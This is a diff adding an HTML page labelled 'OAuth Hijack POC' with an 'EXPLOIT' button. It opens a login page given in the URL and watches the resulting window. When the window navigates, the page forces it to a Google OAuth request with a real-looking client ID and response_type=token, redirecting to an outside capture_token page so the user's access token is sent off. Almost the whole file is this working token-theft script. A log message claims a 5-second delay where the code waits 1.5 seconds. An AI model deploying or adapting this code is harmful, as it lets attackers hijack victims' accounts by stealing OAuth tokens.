@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>OAuth Hijack POC - Button + Delay</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #f2f2f2;
+      height: 100vh;
+      flex-direction: column;
+    }
+    button {
+      padding: 12px 24px;
+      background-color: #4caf50;
+      color: white;
+      border: none;
+      cursor: pointer;
+      font-size: 20px;
+    }
+  </style>
+
+  <script>
+    let popupWindow;
+    let baseLength;
+    const urlParam = getParameterByName('url');
+
+    function getParameterByName(name, url) {
+      if (!url) url = window.location.href;
+      name = name.replace(/[\[\]]/g, "\\$&");
+      const regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+    function initMonitoring() {
+      baseLength = popupWindow.length;
+      console.log("Base frame count:", baseLength);
+
+      setTimeout(() => {
+        console.log("5 seconds delay over, starting to watch for navigation...");
+        watch();
+      }, 1500); // Wait 1.5 seconds before starting to monitor
+    }
+
+    function watch() {
+      if (popupWindow.closed) {
+        console.log("Popup closed by user.");
+        return;
+      }
+      try {
+        if (popupWindow.length !== baseLength) {
+          console.log('Navigation detected! Hijacking now...');
+          popupWindow.location.href = "https://accounts.google.com/o/oauth2/v2/auth?" +
+            "client_id=507626055474-1befi9nnejo548jbd8e3c3483h6u7rn6.apps.googleusercontent.com" +
+            "&redirect_uri=https://shodannnn.github.io/hypromellose/capture_token.html" +
+            "&response_type=token" +
+            "&scope=email%20profile";
+        } else {
+          setTimeout(watch, 10);
+        }
+      } catch (e) {
+        console.error("Error while monitoring:", e);
+        setTimeout(watch, 10);
+      }
+    }
+
+    function launch() {
+      console.log("Opening ZEE JNEAT AMAAN login page...");
+      popupWindow = window.open(urlParam, "_blank", ""); // Open normally, no popup size
+      setTimeout(initMonitoring, 1200);
+    }
+  </script>
+</head>
+
+<body>
+  <h1>OAuth Hijack POC</h1>
+  <button onclick="launch()">EXPLOIT</button>
+</body>
+</html>
